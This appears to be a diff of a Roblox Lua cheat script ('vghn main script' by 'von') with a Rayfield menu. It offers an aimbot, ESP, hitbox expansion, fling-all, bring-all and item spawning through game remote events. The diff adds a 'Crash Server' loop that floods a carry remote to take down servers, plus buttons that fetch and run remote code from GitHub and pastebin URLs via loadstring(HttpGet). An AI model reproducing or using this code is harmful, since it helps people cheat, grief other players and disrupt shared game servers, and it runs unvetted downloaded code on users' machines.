@@ -14,7 +14,7 @@ local selectedPlayer = ""
 
 --  Rayfield Window
 local Window = Rayfield:CreateWindow({
-   Name = "vghn.xyz script",
+   Name = "vghn main script",
    Icon = 0,
    LoadingTitle = "Made with love",
    LoadingSubtitle = "by von",
@@ -30,9 +30,9 @@ local Window = Rayfield:CreateWindow({
    },
    KeySystem = true,
    KeySettings = {
-      Title = "vghn.xyz main",
-      Subtitle = "Von nga e",
-      Note = "WAG KANG KUPAL",
+      Title = "vghn main",
+      Subtitle = "This is made by von",
+      Note = "Wag ka na mangupal",
       FileName = "Check Discord For Key",
       SaveKey = false,
       GrabKeyFromSite = true,
@@ -46,7 +46,7 @@ MainTab:CreateSection("Main")
 
 Rayfield:Notify({
    Title = "pwnded by von",
-   Content = "Thank you for using Von's Script",
+   Content = "Thank you for using Von main Script",
    Duration = 8,
 })
 
@@ -60,17 +60,17 @@ local function addButton(name, url)
    })
 end
 
-addButton("INFINITE YIELD (VON)", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-addButton("MUSIC EXPO (VON)", "https://pastebin.com/raw/i0BvGEMG")
-addButton("FADED (VON)", "https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic")
-addButton("TROLL (VON)", "https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua")
-addButton("HITBOX EXTENDER (VON)", "https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua")
-addButton("ESP (VON)", "https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP")
-addButton("ALADIA AIMBOT (VON)", "https://raw.githubusercontent.com/VonScriptHub/TAONG-GOMA/main/aladia_aimbot.lua")
+addButton("INFINITE YIELD (Von)", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+addButton("MUSIC EXPO (Von)", "https://pastebin.com/raw/i0BvGEMG")
+addButton("FADED (Von)", "https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic")
+addButton("TROLL (Von)", "https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua")
+addButton("HITBOX EXTENDER (Von)", "https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua")
+addButton("ESP (Von)", "https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP")
+addButton("ALADIA AIMBOT (Von)", "https://raw.githubusercontent.com/VonScriptHub/TAONG-GOMA/main/aladia_aimbot.lua")
 
 --  BIG HEAD
 local Button = MainTab:CreateButton({
-   Name = "BIG HEAD [VON]",
+   Name = "BIG HEAD [Von]",
    Callback = function()
    _G.HeadSize = 4 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 0.4 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end)
    end,
@@ -78,7 +78,7 @@ local Button = MainTab:CreateButton({
 
 --  LOOPBRING
 MainTab:CreateButton({
-   Name = "LOOPBRING (VON)",
+   Name = "LOOPBRING (Von)",
    Callback = function()
       if getgenv().LoopBringConn then
          getgenv().LoopBringConn:Disconnect()
@@ -107,9 +107,9 @@ MainTab:CreateButton({
    end,
 })
 
--- ✅ FLING ALL
+--  FLING ALL
 MainTab:CreateButton({
-   Name = "FLING ALL (VON)",
+   Name = "FLING ALL (Von)",
    Callback = function()
       for _, p in pairs(game.Players:GetPlayers()) do
          if p ~= LocalPlayer and p.Character then
@@ -119,11 +119,11 @@ MainTab:CreateButton({
             end
          end
       end
-      Rayfield:Notify({Title="FLING ALL", Content="All players flung", Duration=3})
+      Rayfield:Notify({Title="FLING ALL", Content="All players fling", Duration=3})
    end,
 })
 
--- ✅ SPAWN GUN TAB
+--  SPAWN GUN TAB
 local STab = Window:CreateTab("GUN SPAWN", nil)
 STab:CreateSection("GUN SPAWN")
 
@@ -136,12 +136,35 @@ local function gunButton(name, item)
    })
 end
 
-gunButton("ALL CITY SP (VON)", "Silenced Pistol")
-gunButton("ALL CITY Glock-17 (VON)", "Glock-17")
-gunButton("ALL CITY Glock-19 (VON)", "Glock-19")
-gunButton("ALL CITY Desert Deagle (VON)", "Desert Deagle")
+gunButton("ALL CITY SP (Von)", "Silenced Pistol")
+gunButton("ALL CITY Glock-17 (Von)", "Glock-17")
+gunButton("ALL CITY Glock-19 (Von)", "Glock-19")
+gunButton("ALL CITY Desert Deagle (Von)", "Desert Deagle")
 
--- ✅ BRING TAB
+-- Kalye Spawner Buttons
+local STab = Window:CreateTab("KALYE IMPYERNO", nil)
+STab:CreateSection("Kalye Spawner")
+
+local spawnerItems = {
+    {Name = "BALLISONG [Von]", Value = "Ballisong"},
+    {Name = "CHAINBAT [Von]", Value = "Chainbat"},
+    {Name = "ICEPICK [Von]", Value = "Icepick"}
+}
+
+for _, item in ipairs(spawnerItems) do
+    STab:CreateButton({
+        Name = item.Name,
+        Callback = function()
+            local args = {
+                [1] = "invisfling",
+                [2] = item.Value
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("System"):WaitForChild("Events"):WaitForChild("PickItem"):FireServer(unpack(args))
+        end
+    })
+end
+
+--  BRING TAB
 local BringTab = Window:CreateTab("BRING", nil)
 BringTab:CreateSection("Bring Controls")
 
@@ -211,7 +234,7 @@ BringTab:CreateButton({
 })
 
 BringTab:CreateButton({
-   Name = "Bring all",
+   Name = "Bring all (Couple Hug)",
    Callback = function()
       local ReplicatedStorage = game:GetService("ReplicatedStorage")
       local Players = game:GetService("Players")
@@ -239,13 +262,13 @@ BringTab:CreateButton({
 })
 
 BringTab:CreateButton({
-   Name = "Bring all V2",
+   Name = "Bring all V2 (Pasakal)",
    Callback = function()
       local ReplicatedStorage = game:GetService("ReplicatedStorage")
       local Players = game:GetService("Players")
 
       local carryRemote = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryRemotes"):WaitForChild("CarryRemote")
-      local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Sakal")
+      local carryChoice = ReplicatedStorage:WaitForChild("CarryReplic"):WaitForChild("CarryChoices"):WaitForChild("Pasakal")
       local localPlayer = Players.LocalPlayer
 
       for _, player in pairs(Players:GetPlayers()) do
@@ -266,9 +289,50 @@ BringTab:CreateButton({
    end,
 })
 
+-- Crash Server Button (with loop delay to prevent freezing)
+BringTab:CreateButton({
+    Name = "Crash Server (Couple Hug)",
+    Callback = function()
+        while true do
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= localPlayer then
+                    carryRemote:FireServer({
+                        cmd = "Carry",
+                        carrychoicesss = carryChoice,
+                        firstPlr = player
+                    })
+                end
+            end
+
+            carryRemote:FireServer({
+                cmd = "Declinecarry"
+            })
+
+            task.wait(0.1) -- prevents freeze
+        end
+    end
+})
+
+-- Other Scripts Buttons
+local STab = Window:CreateTab("MORE TOOL", nil)
+STab:CreateSection("SOME TOOLS")
+
+local function GengkoButton(name, url)
+   STab:CreateButton({
+      Name = name,
+      Callback = function()
+         loadstring(game:HttpGet(url, true))()
+      end,
+   })
+end
+
+GengkoButton("Touch Fling (Von)", "https://rawscripts.net/raw/Universal-Script-Touch-fling-script-35192")
+GengkoButton("System Broken (Von)", "https://github.com/IVAN12312312321321321312321213123/Ivan-s-Executor.new/raw/refs/heads/main/SystemBroken.lua")
+GengkoButton("Fix Prompts (Von)", "https://raw.githubusercontent.com/fextroke/prompt/refs/heads/main/prompts%20nga")
+
 -- Aimbot Tab
 MainTab:CreateButton({
-   Name = "AIMBOT (VON)",
+   Name = "AIMBOT (Von)",
    Callback = function()
 
       if getgenv().Aimbot then
